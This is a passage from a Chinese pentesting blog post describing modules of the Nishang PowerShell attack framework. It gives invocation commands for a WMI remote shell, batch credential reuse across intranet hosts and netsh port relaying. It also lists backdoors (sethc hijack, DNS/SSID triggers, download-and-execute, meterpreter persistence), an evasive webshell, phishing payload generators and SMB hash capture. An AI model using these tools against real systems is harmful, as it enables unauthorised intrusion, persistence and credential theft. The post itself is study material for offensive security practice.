+<p>通过wmi shell 其实你可以把它当成psexec的’powershell’版,非常实用,它支持不同的shell类型,可根据自己的实际需求选择<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PowerShellWmi.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PowerShellWmi -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -UserName rootkit\administrator -ShellType Cmd</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps wmic shell.jpg" alt=""></p>
+<p>通过gmail向目标机器发送控制指令,会不会想起gcat或者gdog呢,嘿嘿……我们知道它是通过gmail来转储一堆json数据的,其实这俩脚本做的事情跟那个一样,因为不太稳定,实用性也不是非常大,这里就不详细说了,虽然邮箱密码不是我们的,但也不能太那啥……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Invoke-PsGcat.ps1 	向gmail发送数据</div><div class="line">Invoke-PsGcatAgent.ps1 	从gmail上取刚才发的数据</div></pre></td></tr></table></figure></p>
+<p>0x08 内网跳板,比较实用[Pivot]</p>
+<p>Create-MultipleSessions.ps1[根据提供的口令批量检查内网的其它机器是否同样可用],本来是可以配合Run-EXEonRemote.ps1批量远程执行的,但实际测试中一直未成功,不过没关系,我们可以在检查完口令以后,再通过wce/mimikatz配合winexec的方式,批量种马也是一样的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Pivot\Create-MultipleSessions.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Create-MultipleSessions -filename <span class="symbol">C:</span>\hostname.txt -Creds    这儿会提示你输入账号密码,然后它会拿着这个账号到你hostname中指定的机器名上去挨个尝试</div></pre></td></tr></table></figure></p>
+<p><img src="/img/create-multipleseessions.png" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Invoke-NetworkRelay.ps1  其实就是转发,它同样也是利用netsh的方式进行转发的,关于更详细的利用netsh进行内网转发的,可以直接去看相关文章,这里就不再重复了</div><div class="line">Invoke-NetworkRelay -Relay v4tov4 -ListenAddress <span class="number">192.168</span>.<span class="number">3.251</span> -Listenport <span class="number">3389</span> -ConnectAddress <span class="number">192.168</span>.<span class="number">3.23</span>  -ConnectPort <span class="number">3387</span> -ComputerName <span class="number">192.168</span>.<span class="number">3.251</span> 把<span class="number">23</span>的<span class="number">3387</span>转到<span class="number">251</span>的<span class="number">3389</span></div></pre></td></tr></table></figure>
+<p>0x09 留后门,比较简单,这里就不一一演示了[Backdoors]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Add-RegBackdoor.ps1 	劫持sethc.exe和utilman.exe,其实,就是古老的shift后门</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Backdoors\Add-RegBackdoor.ps1</div></pre></td></tr></table></figure></p>
+<p><img src="/img/Add-RegBackdoor.png" alt=""><br><img src="/img/Add-RegBackdoor res.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Add-ScrnSaveBackdoor.ps1   	通过屏保执行指令</div><div class="line">DNS_TXT_Pwnage.ps1   		dns后门,当然啦,你需要个dns服务器</div><div class="line">Execute-OnTime.ps1  	 	定时下载并执行ps 的payload,记得,加上persist选项就可以实现自启动了</div><div class="line">Gupt-Backdoor.ps1   	 	这绝对是个吊炸天的想法,挺佩服做着的脑洞的,赞,通过ssid来执行后门,后期会把这个和上面那个模块再单独拿出来说明</div><div class="line">HTTP-Backdoor.ps1   		就是个普通的ps版的下载者</div><div class="line">Invoke-ADSBackdoor.ps1  	配合meterpreter注入shellcode实现持久控制</div></pre></td></tr></table></figure>
+<p>0x10 ps版的webshell,免杀效果不错,能满足日常的上传下载命以及令执行[Antak-WebShell],记得改下账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">antak.aspx  aspx的webshell</div></pre></td></tr></table></figure></p>
+<p>0x11 下面是一些比较粗糙的钓鱼模块,关于office系列的就不说了吧,因为都要启用宏,比较鸡肋,成功率相对比较高的可能就下面这些了,自带的信内容肯定是不合适的,如果真想发信,自己根据实际需求改一下就好了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Out-CHM.ps1    </div><div class="line">Out-HTA.ps1</div><div class="line">Out-Java.ps1</div><div class="line">Out-JS.ps1</div><div class="line">Out-SCF.ps1</div><div class="line">Out-SCT.ps1</div><div class="line">Out-Shortcut.ps1</div><div class="line">Out-WebQuery.ps1</div></pre></td></tr></table></figure></p>
+<p>0x12 如果想一键使用nishang中的所有功能[powerpreter],直接导入下面的模块即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powerpreter.psm1</div></pre></td></tr></table></figure></p>
+<p>0x13 其它的一些辅助性的功能模块[Utility]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">StringToBase64.ps1		base64编码</div><div class="line">Base64ToString.ps1 		base64解码</div><div class="line">ConvertTo-ROT13.ps1     	rot13加密</div><div class="line">Download.ps1			下载文件</div><div class="line">ExetoText.ps1			将可执行文件转换成文本</div><div class="line">TexttoExe.ps1			将可文本转换成可执行文件</div><div class="line">Invoke-Decode.ps1		解码</div><div class="line">Invoke-Encode.ps1		编码</div><div class="line">Parse_Keys.ps1			用来还原键盘记录中的内容</div><div class="line">Start-CaptureServer.ps1		抓取smb的hash</div><div class="line">Add-Persistence.ps1		加入自启动ps脚本,实现持久控制</div><div class="line">Remove-Persistence.ps1		删除自启动ps脚本</div><div class="line">Speak.ps1 			最后再说个很有趣的小教本,让对方系统播放指定的语音</div></pre></td></tr></table></figure></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;不得不说,老外们的脑洞确实比我们大很多,虽然只是一款小工具,但带我们的思路确实无穷的,起码本人是受益颇多,对于win渗透来讲,powershell无疑就是最好而且纯天然的渗透工具,因为能直接跟系统api灵活接触,这一点是无可比拟的优势,所以还是很值得我们花大量的时间去研究学习的</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/nishang/">#nishang</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
